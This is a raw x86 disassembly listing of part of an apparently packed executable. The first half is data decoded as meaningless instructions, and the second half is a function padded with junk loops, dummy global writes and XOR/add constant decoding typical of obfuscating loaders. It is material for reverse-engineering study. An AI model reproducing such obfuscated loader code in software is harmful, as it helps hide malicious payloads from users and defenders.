  408c10:	push   esp
  408c11:	mov    WORD PTR [edx-0x38],gs
  408c14:	or     BYTE PTR [edi+0x334e81b7],al
  408c1a:	mov    eax,0x20ed5e8d
  408c1f:	inc    edx
  408c20:	inc    edx
  408c21:	sbb    bh,al
  408c23:	pop    eax
  408c24:	(bad)
  408c28:	dec    edx
  408c29:	arpl   WORD PTR [ebx+ebp*1+0x736ec1fb],cx
  408c30:	cli    
  408c31:	nop
  408c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c33:	shr    DWORD PTR [ecx],1
  408c35:	call   0xf6023291
  408c3a:	in     eax,0x99
  408c3c:	jmp    0x408c79
  408c3e:	jb     0x408bcf
  408c40:	nop
  408c41:	inc    edi
  408c42:	add    edx,DWORD PTR [ecx*1+0x67d1f46d]
  408c49:	jl     0x408bf1
  408c4b:	retf   0x1207
  408c4e:	rcr    DWORD PTR [esi],cl
  408c50:	in     eax,dx
  408c51:	in     eax,dx
  408c52:	push   esp
  408c53:	and    al,0x53
  408c55:	or     ecx,esi
  408c57:	mov    DWORD PTR [edi+0x2f4d4c92],esp
  408c5d:	or     dh,bh
  408c5f:	mov    dh,0xbb
  408c61:	mov    ecx,0xc682af9f
  408c66:	dec    edx
  408c67:	mov    ebx,0x8bf295ae
  408c6c:	mov    ?,esp
  408c6e:	jmp    0x408c59
  408c70:	sub    esp,0x2623161e
  408c76:	sti    
  408c77:	lahf   
  408c78:	loopne 0x408c1b
  408c7a:	push   edx
  408c7b:	add    al,0x8a
  408c7d:	pop    ds
  408c7e:	popf   
  408c7f:	int3   
  408c80:	mov    al,ch
  408c82:	je     0x408cd3
  408c84:	lods   eax,DWORD PTR ds:[esi]
  408c85:	inc    ecx
  408c86:	cld    
  408c87:	ss add al,0xbd
  408c8a:	(bad)  
  408c8b:	dec    esp
  408c8c:	js     0x408cbe
  408c8e:	dec    ebx
  408c8f:	and    cl,BYTE PTR [ebx+0x2726fd45]
  408c95:	adc    eax,0x768d8ccd
  408c9a:	shl    esi,1
  408c9c:	dec    esi
  408c9d:	ds add ch,al
  408ca0:	std    
  408ca1:	sbb    eax,0x3407179f
  408ca6:	sbb    ecx,DWORD PTR [edx+0x59]
  408ca9:	mov    eax,0x968641eb
  408cae:	in     eax,dx
  408caf:	mov    bl,0xad
  408cb1:	pop    edi
  408cb2:	cmp    eax,0xfb0fd585
  408cb7:	repnz xor al,BYTE PTR [edx]
  408cba:	es mov ecx,0x385b7002
  408cc0:	sahf   
  408cc1:	xor    BYTE PTR [esi-0x457fecf8],cl
  408cc7:	mov    DWORD PTR [esi-0x17],ebx
  408cca:	cmc    
  408ccb:	lds    esp,FWORD PTR [eax-0x6a26a4b0]
  408cd1:	ror    BYTE PTR [esp+ecx*8],cl
  408cd4:	mov    ebp,0x5c095d67
  408cd9:	in     al,dx
  408cda:	aam    0xa8
  408cdc:	daa    
  408cdd:	aaa    
  408cde:	js     0x408d4e
  408ce0:	mov    WORD PTR [ecx*2-0x12459e47],gs
  408ce7:	cdq    
  408ce8:	add    BYTE PTR [ebp-0x7b],dl
  408ceb:	adc    eax,0x61e60115
  408cf0:	lds    esp,FWORD PTR [ebx]
  408cf2:	or     esp,DWORD PTR [ebx-0x1a]
  408cf5:	mov    DWORD PTR [edx+0x2e],ebp
  408cf8:	popf   
  408cf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cfa:	test   DWORD PTR [edi],ebx
  408cfc:	scas   eax,DWORD PTR es:[edi]
  408cfd:	mov    dl,0xbc
  408cff:	adc    DWORD PTR [edi+0x57ba2cba],esp
  408d05:	je     0x408d4d
  408d07:	test   eax,0x7ffc0acd
  408d0c:	out    0x5e,eax
  408d0e:	pushf  
  408d0f:	je     0x408caf
  408d11:	pop    ds
  408d12:	frstor [esi+0x67]
  408d15:	sub    al,0x73
  408d17:	add    BYTE PTR [esi-0x2b97ffc7],dh
  408d1d:	leave  
  408d1e:	stos   BYTE PTR es:[edi],al
  408d1f:	fild   DWORD PTR [esi]
  408d21:	in     al,0x3f
  408d23:	or     DWORD PTR [ebx-0x5ca96232],edx
  408d29:	xor    cl,ah
  408d2b:	aam    0x95
  408d2d:	retf   0x6985
  408d30:	stc    
  408d31:	xchg   ebx,eax
  408d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d33:	push   ebx
  408d34:	loop   0x408d41
  408d36:	jnp    0x408cc6
  408d38:	inc    ebx
  408d39:	and    ecx,DWORD PTR [edx]
  408d3b:	jmp    0xb6d50333
  408d40:	cmp    ch,ah
  408d42:	lahf   
  408d43:	imul   edi,eax,0xe3881470
  408d49:	inc    edx
  408d4a:	push   ss
  408d4b:	push   eax
  408d4c:	adc    BYTE PTR [eax],0x52
  408d4f:	pop    esp
  408d50:	cmp    edi,DWORD PTR [esi+0x518bf92]
  408d56:	sub    eax,0xa2b12bbe
  408d5b:	in     eax,dx
  408d5c:	dec    eax
  408d5d:	fmul   QWORD PTR ds:0xbb5563cd
  408d63:	mov    ebp,0x5d208a9
  408d68:	xor    DWORD PTR [eax],ebx
  408d6a:	fcomi  st,st(6)
  408d6c:	push   edx
  408d6d:	stc    
  408d6e:	das    
  408d6f:	clc    
  408d70:	jecxz  0x408de9
  408d72:	xor    BYTE PTR [edi+0x18298396],ah
  408d78:	add    edx,edi
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	mov    ds:0xb131184f,eax
  408daf:	sar    DWORD PTR [esi+0x7e],1
  408db2:	mov    bh,BYTE PTR [edi+0x7e]
  408db5:	jle    0x408e32
  408db7:	jge    0x408e0b
  408db9:	loopne 0x408e3a
  408dbb:	pop    edi
  408dbc:	stos   BYTE PTR es:[edi],al
  408dbd:	cmp    al,0xb9
  408dbf:	test   eax,0x9e9d7ef8
  408dc4:	mov    ebp,0x41819e15
  408dc9:	push   esp
  408dca:	sub    ebp,ebp
  408dcc:	int3   
  408dcd:	cmc    
  408dce:	jb     0x408e19
  408dd0:	mov    ebp,0xa262c871
  408dd5:	xchg   ebx,eax
  408dd6:	xor    al,0x1c
  408dd8:	mov    ecx,0x5bd74715
  408ddd:	rcr    cl,0xd6
  408de0:	pushf  
  408de1:	std    
  408de2:	dec    esi
  408de3:	xchg   edi,eax
  408de4:	add    esp,DWORD PTR [eax-0x38]
  408de7:	mov    ds:0x51dbd652,eax
  408dec:	fiadd  DWORD PTR [ecx]
  408dee:	push   eax
  408def:	dec    ecx
  408df0:	cmp    DWORD PTR [ebp+0x44d9b09a],edx
  408df6:	sbb    esp,DWORD PTR [edx]
  408df8:	ffreep st(4)
  408dfa:	sti    
  408dfb:	push   0xf002fd77
  408e00:	mov    cl,0x5f
  408e02:	lock cmp BYTE PTR [ecx],bl
  408e05:	rol    BYTE PTR [ebp-0x1d],cl
  408e08:	(bad)  
  408e09:	and    eax,DWORD PTR [ebx]
  408e0b:	mov    edi,0x5d15e3ba
  408e10:	adc    DWORD PTR [esi],esp
  408e12:	xor    DWORD PTR [esi-0xd3c600c],edx
  408e18:	mov    ds:0x6061f7d4,al
  408e1d:	imul   ebp,DWORD PTR [eax-0x12],0x0
  408e21:	loope  0x408e92
  408e23:	mov    ebp,0xb7b336be
  408e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e29:	neg    DWORD PTR [esi]
  408e2b:	xor    BYTE PTR [eax+ebx*1+0x6d],0x66
  408e30:	inc    edi
  408e31:	jnp    0x408dde
  408e33:	and    ah,BYTE PTR [eax-0x7d]
  408e36:	aam    0x92
  408e38:	mul    BYTE PTR [edx]
  408e3a:	mov    ah,0xac
  408e3c:	sub    ah,BYTE PTR [ebx+0x31]
  408e3f:	mov    ch,0x88
  408e41:	pop    es
  408e42:	adc    DWORD PTR [esi+0x5f],edi
  408e45:	sahf   
  408e46:	aas    
  408e47:	push   ebx
  408e48:	dec    edx
  408e49:	sbb    BYTE PTR [edi+0x62],bh
  408e4c:	in     al,0x6a
  408e4e:	adc    ch,BYTE PTR [ebx+ebx*4]
  408e51:	pop    es
  408e52:	mov    dl,0x55
  408e54:	loop   0x408e41
  408e56:	push   esp
  408e57:	popa   
  408e58:	sub    BYTE PTR [ebx],0xd1
  408e5b:	xchg   ebp,eax
  408e5c:	test   al,0x4d
  408e5e:	mov    cl,0xc7
  408e60:	jae    0x408e7e
  408e62:	jo     0x408ea8
  408e64:	inc    ecx
  408e65:	out    dx,eax
  408e66:	stc    
  408e67:	out    dx,al
  408e68:	xor    ch,al
  408e6a:	jns    0x408dfe
  408e6c:	cmc    
  408e6d:	jns    0x408e84
  408e6f:	adc    edx,DWORD PTR [edx+edx*1-0x5264e02c]
  408e76:	push   es
  408e77:	add    ah,dl
  408e79:	inc    ebp
  408e7a:	test   al,0x90
  408e7c:	cld    
  408e7d:	(bad)  
  408e7f:	lds    eax,FWORD PTR [ebx]
  408e81:	call   0x22c18b18
  408e86:	mov    al,ds:0x9d679a74
  408e8b:	mov    ch,0x9c
  408e8d:	call   0x7901:0x456bad8c
  408e94:	stc    
  408e95:	or     ebp,edi
  408e97:	push   esp
  408e98:	sub    dh,dh
  408e9a:	and    BYTE PTR [ebp-0x34559a58],bl
  408ea0:	stos   BYTE PTR es:[edi],al
  408ea1:	sbb    edi,DWORD PTR [ebx+esi*2-0x37]
  408ea5:	mov    cs:0x34a55692,eax
  408eab:	repz hlt 
  408ead:	call   0xadc1:0x68c05dae
  408eb4:	mov    ecx,0xed340dae
  408eb9:	enter  0xa50f,0x6b
  408ebd:	inc    edx
  408ebe:	xchg   esp,eax
  408ec0:	cli    
  408ec1:	retf   0x3022
  408ec4:	popf   
  408ec5:	fwait
  408ec6:	js     0x408e64
  408ec8:	nop
  408ec9:	sar    BYTE PTR [edi-0x1aa68cee],cl
  408ecf:	pop    ecx
  408ed0:	push   esi
  408ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ed2:	fwait
  408ed3:	push   cs
  408ed4:	xor    eax,0x5c7dbe54
  408ed9:	nop
  408eda:	bound  esi,QWORD PTR [edi+0x2c]
  408edd:	and    BYTE PTR [edi+edx*2+0xfaa969],dh
  408ee4:	cwde   
  408ee5:	outs   dx,BYTE PTR ds:[esi]
  408ee6:	enter  0x33e9,0x6a
  408eea:	inc    ecx
  408eeb:	adc    cl,cl
  408eed:	mov    DWORD PTR [edi-0x27b84df3],esi
  408ef3:	jecxz  0x408f1c
  408ef5:	ja     0x408f18
  408ef7:	xchg   esi,eax
  408ef8:	shr    ecx,1
  408efa:	adc    esi,DWORD PTR [ecx+0x1c]
  408efd:	cwde   
  408efe:	scas   al,BYTE PTR es:[edi]
  408eff:	or     DWORD PTR [ecx],esp
  408f01:	inc    esp
  408f02:	imul   ecx,DWORD PTR [ecx],0xa3dd3273
  408f08:	lds    ebp,FWORD PTR [ebp-0x5eae5c79]
  408f0e:	xchg   esi,eax
  408f0f:	cmp    ecx,DWORD PTR [esi+0x4544c908]
  408f15:	jl     0x408f1c
  408f17:	fmul   st,st(6)
  408f19:	test   BYTE PTR [edi],dh
  408f1b:	ins    DWORD PTR es:[edi],dx
  408f1c:	pop    edx
  408f1d:	pop    edx
  408f1e:	jae    0x408ec5
  408f20:	scas   eax,DWORD PTR es:[edi]
  408f21:	leave  
  408f22:	mov    cl,0xe4
  408f24:	lods   al,BYTE PTR ds:[esi]
  408f25:	aam    0x6c
  408f27:	push   ecx
  408f28:	bound  ebp,QWORD PTR [ecx]
  408f2a:	mov    cl,0xb6
  408f2c:	sub    DWORD PTR [ebx-0x3c],esp
  408f2f:	jge    0x408eb4
  408f31:	imul   edi,DWORD PTR [ebx-0x22e31d65],0xfffffff8
  408f38:	int    0xbc
  408f3a:	pushf  
  408f3b:	mov    al,0x41
  408f3d:	inc    esi
  408f3e:	fs ret 0x8c39
  408f42:	pop    es
  408f43:	aaa    
  408f44:	or     ebx,DWORD PTR [eax+0x39]
  408f47:	cld    
  408f48:	xor    edi,DWORD PTR [ebp+0x33f85d8b]
  408f4e:	shr    cl,1
  408f50:	lods   al,BYTE PTR ds:[esi]
  408f51:	add    DWORD PTR [eax],eax
  408f53:	add    BYTE PTR [esi+eax*1],cl
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	push   ebp
  408f61:	sbb    ecx,DWORD PTR [esi]
  408f63:	addr16 int 0xdf
  408f66:	jle    0x408fe6
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408fb3
  408f6d:	aaa    
  408f6e:	mov    dl,0x4d
  408f70:	jge    0x408fcd
  408f72:	ins    BYTE PTR es:[edi],dx
  408f73:	cwde   
  408f74:	and    bl,dh
  408f76:	add    ch,BYTE PTR [edi-0x27]
  408f79:	cld    
  408f7a:	ins    DWORD PTR es:[edi],dx
  408f7b:	mov    DWORD PTR [edx],esp
  408f7d:	add    edx,DWORD PTR [esi]
  408f7f:	rcr    BYTE PTR [eax+0x1c87b77b],1
  408f85:	shl    eax,cl
  408f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f88:	mov    ch,0xe
  408f8a:	jl     0x408fc2
  408f8c:	clc    
  408f8d:	adc    BYTE PTR [eax+0x7570d5af],cl
  408f93:	mov    ch,0xf1
  408f95:	push   ebp
  408f96:	in     al,dx
  408f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f98:	out    dx,eax
  408f99:	loop   0x408f92
  408f9b:	int    0x8b
  408f9d:	and    bl,BYTE PTR [eax+ecx*4]
  408fa0:	test   BYTE PTR [edi],bl
  408fa2:	jge    0x408f5e
  408fa4:	mov    eax,ds:0xd0e27690
  408fa9:	pop    eax
  408faa:	mov    edx,DWORD PTR [esi]
  408fac:	cmp    BYTE PTR [eax+0x38],dh
  408faf:	ins    DWORD PTR es:[edi],dx
  408fb0:	cdq    
  408fb1:	inc    ebp
  408fb2:	jmp    0xe5ab:0xebc6e5b8
  408fb9:	and    edi,DWORD PTR [edi-0x49]
  408fbc:	sub    al,0xae
  408fbe:	cld    
  408fbf:	push   eax
  408fc0:	inc    ecx
  408fc1:	xchg   esp,eax
  408fc2:	ds xchg edx,eax
  408fc4:	test   esp,esp
  408fc6:	xchg   bl,dl
  408fc8:	xor    al,0xf
  408fca:	push   edi
  408fcb:	push   es
  408fcc:	imul   ebx,DWORD PTR [ebx+0x6ae520f],0xe
  408fd3:	(bad)  
  408fd4:	push   cs
  408fd5:	cdq    
  408fd6:	call   0x5dd:0x76f7d654
  408fdd:	push   edi
  408fde:	out    dx,al
  408fdf:	retf   
  408fe0:	add    BYTE PTR [edi-0x18],ch
  408fe3:	ror    BYTE PTR [ecx-0x10],0x30
  408fe7:	les    ebp,FWORD PTR [esi]
  408fe9:	and    DWORD PTR [edi+0x7c],ecx
  408fec:	les    esp,FWORD PTR [ebp-0x2b]
  408fef:	jbe    0x408fc1
  408ff1:	mov    edi,0x47b6dc5f
  408ff6:	dec    ecx
  408ff7:	retf   0x236c
  408ffa:	mov    ecx,0x6798a50c
  408fff:	inc    eax
  409000:	mov    dl,0x62
  409002:	imul   ebp,DWORD PTR [ecx],0xb35780fd
  409008:	pop    edi
  409009:	hlt    
  40900a:	cmp    BYTE PTR [eax+edi*4+0x63],0x3
  40900f:	gs mul al
  409012:	mov    edi,0xe4710594
  409017:	inc    ecx
  409018:	xchg   ebx,eax
  409019:	test   al,0x12
  40901b:	(bad)  
  40901c:	sub    eax,0x29c358e5
  409021:	jno    0x408fc1
  409023:	add    ch,bh
  409025:	repz cs mov bh,0x47
  409029:	jmp    0x8d67ac7f
  40902e:	xor    edi,DWORD PTR [ebp+edx*8-0x2a]
  409032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409033:	fld    DWORD PTR [ecx+0x10499803]
  409039:	arpl   di,si
  40903b:	fdivp  st(3),st
  40903d:	inc    ebp
  40903e:	ret    
  40903f:	sbb    DWORD PTR [ecx],ecx
  409041:	pop    ds
  409042:	pop    esp
  409043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409044:	mov    dl,0x86
  409046:	cmp    DWORD PTR [edx-0x5c],ebx
  409049:	xor    BYTE PTR [eax],bl
  40904b:	sbb    ebx,DWORD PTR [edx-0x2d]
  40904e:	aad    0x98
  409050:	mov    bl,0x6a
  409052:	fisub  DWORD PTR [ebx]
  409054:	shr    DWORD PTR [esi+0x6b9fc5ee],cl
  40905a:	(bad)  
  40905b:	xchg   esi,eax
  40905c:	xor    BYTE PTR [edx+0x3cea55f7],bh
  409062:	je     0x4090d3
  409064:	(bad)  
  409065:	fsubr  QWORD PTR [ebx]
  409067:	int3   
  409068:	nop
  409069:	and    eax,0xae5a4c4e
  40906e:	push   ss
  40906f:	push   cs
  409070:	out    dx,al
  409071:	sub    BYTE PTR [eax],al
  409073:	rcl    BYTE PTR [ebp+edi*4-0x13],cl
  409077:	mov    edi,0x609f5759
  40907c:	sub    al,0xc6
  40907e:	xchg   ecx,eax
  40907f:	pop    esp
  409080:	mov    bh,0x16
  409082:	add    al,0xdb
  409084:	xchg   ecx,eax
  409085:	cmp    al,0x29
  409087:	ficom  DWORD PTR [esp+eax*8-0x1d521460]
  40908e:	sbb    eax,0x93a272b3
  409093:	sbb    eax,edx
  409095:	push   edi
  409096:	aad    0x7a
  409098:	sahf   
  409099:	outs   dx,BYTE PTR ds:[esi]
  40909a:	jmp    0x1892:0x4d9d7b41
  4090a1:	inc    ebp
  4090a2:	int3   
  4090a3:	lods   al,BYTE PTR ds:[esi]
  4090a4:	push   0xffffffd7
  4090a6:	es enter 0x90da,0xd3
  4090ab:	fbstp  TBYTE PTR [edx-0x48aa93c5]
  4090b1:	inc    eax
  4090b2:	jle    0x40911f
  4090b4:	dec    ecx
  4090b5:	sbb    dl,BYTE PTR [ebp+0x2cc57880]
  4090bb:	pushf  
  4090bc:	stc    
  4090bd:	jle    0xc466cd68
  4090c3:	test   DWORD PTR [ebx-0x3a],ebx
  4090c6:	je     0x4090f8
  4090c8:	scas   al,BYTE PTR es:[edi]
  4090c9:	xchg   BYTE PTR [ecx],dl
  4090cb:	jmp    0x40906f
  4090cd:	imul   eax,DWORD PTR ds:0x433a336a,0xffffff8e
  4090d4:	push   ecx
  4090d5:	addr16 mov ch,0x59
  4090d8:	out    0x15,al
  4090da:	jl     0x4090a3
  4090dc:	push   cs
  4090dd:	mov    dh,0xe6
  4090df:	cmp    dl,BYTE PTR [ebp+0x17]
  4090e2:	enter  0x5cc2,0xdb
  4090e6:	pusha  
  4090e7:	shl    bl,1
  4090e9:	in     eax,dx
  4090ea:	xlat   BYTE PTR ds:[ebx]
  4090eb:	out    dx,eax
  4090ec:	nop
  4090ed:	dec    edx
  4090ee:	int3   
  4090ef:	test   al,0x42
  4090f1:	push   edx
  4090f2:	jge    0x4090aa
  4090f4:	retf   
  4090f5:	out    0x38,al
  4090f7:	into   
  4090f8:	fdiv   DWORD PTR [ebx-0x19]
  4090fb:	push   ss
  4090fc:	sbb    eax,0x3b662e5
  409101:	ror    DWORD PTR [edi],1
  409103:	scas   eax,DWORD PTR es:[edi]
  409104:	sar    DWORD PTR [ebx],cl
  409106:	xlat   BYTE PTR ds:[ebx]
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42e8b7
  40911f:	and    DWORD PTR ds:0x43035b,0x4302bd
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42ec5b,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x430363,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e658,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42e8f7
  40916b:	sbb    DWORD PTR ds:0x4302c1,0x4302f1
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42ec4b,0x624a
  409184:	call   DWORD PTR ds:0x42e8bf
  40918a:	adc    DWORD PTR ds:0x42e640,0x4302dd
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x4302d1,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x4302b5,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x4302ed,0x42e654
  4091c4:	call   DWORD PTR ds:0x42e963
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e648
  4091d6:	and    DWORD PTR ds:0x4302d9,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x4302b9,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42ec5b,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42ec5b,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e863
  409219:	mov    ecx,DWORD PTR ds:0x42ec5b
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42ec5b,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ec63,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42ec5f
  409243:	sbb    eax,DWORD PTR ds:0x42ec5b
  409249:	mov    ds:0x42ec5f,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42ec5b
  409261:	and    DWORD PTR ds:0x42e63c,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x4302d5,0x430357
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e64c,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x4302d5,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42ec4b,0x430367
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42ec4b,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x4302c9,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x4302d9,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ec63,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e648,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x4302b5,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e87f
  40930f:	adc    DWORD PTR ds:0x42ec5f,0x42e64c
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x4302d5,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x4302d1,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x4302d1
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x4302d1,ecx
  409352:	cmp    DWORD PTR ds:0x4302d1,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x4302d1,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e867
  409375:	cmp    DWORD PTR ds:0x4302d1,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x4302d1
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x4302d1,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42ec4b
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e7e7
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x430353,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x43036b,0x17
  4093b9:	cmp    DWORD PTR ds:0x43036b,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x43036b,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e86b
  4093df:	cmp    DWORD PTR ds:0x43036b,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x43036b
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x43036b,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x43036b
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x43036b,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x43035f,0x10
  409415:	cmp    DWORD PTR ds:0x43035f,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x43035f,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e86f
  409438:	mov    ecx,DWORD PTR ds:0x43035f
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x43035f,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x4302e1
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x4302e9,0x16
  409461:	cmp    DWORD PTR ds:0x4302e9,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x4302e9,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e873
  409481:	mov    ecx,DWORD PTR ds:0x4302e9
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x4302e9,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42ec4f,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42ec4f
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42ec4f,ecx
  4094b7:	cmp    DWORD PTR ds:0x42ec4f,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42ec4f,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e77b
  4094d6:	push   0x42e725
  4094db:	call   DWORD PTR ds:0x42eaab
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x4302d1,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x43036b,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ec63,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x4302e9,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x430363,0x4302f1
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x4302b9,0x1e
  40953f:	cmp    DWORD PTR ds:0x4302b9,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x4302b9,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e65c
  409566:	call   DWORD PTR ds:0x42e877
  40956c:	mov    eax,ds:0x4302b9
  409571:	dec    eax
  409572:	mov    ds:0x4302b9,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430309
  409582:	mov    eax,ds:0x430393
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x43034f,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
